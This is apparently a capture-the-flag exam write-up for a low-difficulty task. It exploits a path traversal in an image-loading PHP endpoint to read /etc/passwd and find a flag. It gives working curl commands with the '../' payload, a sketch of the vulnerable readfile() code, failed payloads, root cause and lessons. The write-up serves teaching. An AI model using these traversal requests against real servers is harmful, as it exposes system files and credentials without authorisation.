\# Task 2 — File Read



\*\*CyberEd Portal — HackCamp 2026 Penetration Testing Exam\*\*



| Information    | Details                                                                                                           |

| -------------- | ----------------------------------------------------------------------------------------------------------------- |

| \*\*Task\*\*       | 2 — File Read                                                                                                     |

| \*\*Difficulty\*\* | Low                                                                                                               |

| \*\*Objective\*\*  | Analyze image-loading traffic, identify a directory traversal vulnerability, and read the flag from `/etc/passwd` |

| \*\*Target\*\*     | `<TARGET\_URL>`                                                                                                    |

| \*\*Platform\*\*   | CyberEd Portal                                                                                                    |

| \*\*Group\*\*      | 362                                                                                                               |



\---



\## Attack Chain



```text

Image loading functionality

&#x20;       ↓

`/image.php?file=`

&#x20;       ↓

Path Traversal

&#x20;       ↓

Arbitrary File Read

&#x20;       ↓

`/etc/passwd`

&#x20;       ↓

Flag

```



\---



\# 1. Finding the Image-Loading Endpoint



I first inspected the website source to understand how images were being loaded.



```bash

curl -s "<TARGET\_URL>/" | grep -iE 'img|src=|image|file'

```



The response revealed an image request similar to:



```html

<img ... src="/image.php?file=apple-touch-icon-57x57.png">

```



This was interesting because the application was using a PHP endpoint named:



```text

/image.php

```



with a user-controlled `file` parameter.



This suggested that the application might be reading files directly from the server.



\---



\# 2. Testing for Path Traversal



I tested whether the `file` parameter could be manipulated using directory traversal sequences.



The payload used was:



```text

../../../../../../etc/passwd

```



The request was:



```bash

curl -s "<TARGET\_URL>/image.php?file=../../../../../../etc/passwd"

```



The server returned the contents of `/etc/passwd`.



This confirmed an \*\*arbitrary file read / path traversal vulnerability\*\*.



\---



\# 3. Retrieving the Flag



The flag was located on the last line of `/etc/passwd`.



The response contained:



```text

\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

<THE\_FLAG>

```



The flag could also be extracted automatically with:



```bash

curl -s "<TARGET\_URL>/image.php?file=../../../../../../etc/passwd" | grep -oE '\[A-Za-z0-9]{32}'

```



\---



\# 4. Why the Traversal Worked



The vulnerable application concatenated the supplied filename with a directory path similar to:



```text

/var/www/html/static/

```



Conceptually, the application was performing something equivalent to:



```php

readfile("/var/www/html/static/" . $\_GET\["file"]);

```



Because the input was not properly sanitized, traversal sequences could move outside the intended directory.



For example:



```text

/var/www/html/static/../../../../../../etc/passwd

```



eventually resolves to:



```text

/etc/passwd

```



Therefore, an attacker could read arbitrary files accessible to the web server process.



\---



\# 5. Payloads That Did Not Work



Several alternative approaches were considered.



\### Absolute Path



```text

/etc/passwd

```



This did not work because the application prefixed the supplied value with its static directory:



```text

/var/www/html/static//etc/passwd

```



\### PHP Filter Wrapper



A `php://filter` payload was also considered, but the application's path prefixing prevented the wrapper from being interpreted as intended.



\### Directory Traversal



The successful payload was:



```text

../../../../../../etc/passwd

```



The traversal escaped the intended `static` directory and reached the system's `/etc/passwd`.



\---



\# 6. Root Cause



The vulnerability was caused by an unsanitized user-controlled `file` parameter being passed to a file-reading function.



\### Vulnerable Pattern



```text

User input

&#x20;   ↓

file parameter

&#x20;   ↓

File path construction

&#x20;   ↓

readfile()

```



No effective validation was performed to ensure that the requested file remained inside the intended directory.



This resulted in:



\*\*Path Traversal → Arbitrary File Read\*\*



\---



\# 7. Impact



An attacker exploiting this vulnerability could potentially read sensitive files accessible to the web server.



Depending on the server configuration and permissions, this could expose:



\* Application configuration files

\* Credentials

\* Source code

\* Environment information

\* System files

\* Other sensitive application data



In this challenge, the vulnerability was specifically used to read:



```text

/etc/passwd

```



and retrieve the planted flag.



\---



\# 8. Flag



```text

<THE\_FLAG>

```



> Replace `<THE\_FLAG>` with the flag from your exam deployment if publishing it is permitted.



\---



\# 9. Lessons Learned



\* Inspect how application resources such as images are loaded.

\* User-controlled file parameters should always be treated as potentially dangerous.

\* Test file-loading endpoints for directory traversal.

\* `../` sequences can allow an attacker to escape an intended directory.

\* Absolute paths may fail when an application prepends its own directory.

\* Always consider how the application constructs the final filesystem path.

\* Arbitrary file read vulnerabilities can expose sensitive server information.



\---



\# 10. Final Attack Path



```text

Website

&#x20;  │

&#x20;  ▼

Inspect image requests

&#x20;  │

&#x20;  ▼

`/image.php?file=`

&#x20;  │

&#x20;  ▼

Test `../` traversal

&#x20;  │

&#x20;  ▼

Read `/etc/passwd`

&#x20;  │

&#x20;  ▼

Locate flag

&#x20;  │

&#x20;  ▼

FLAG

```



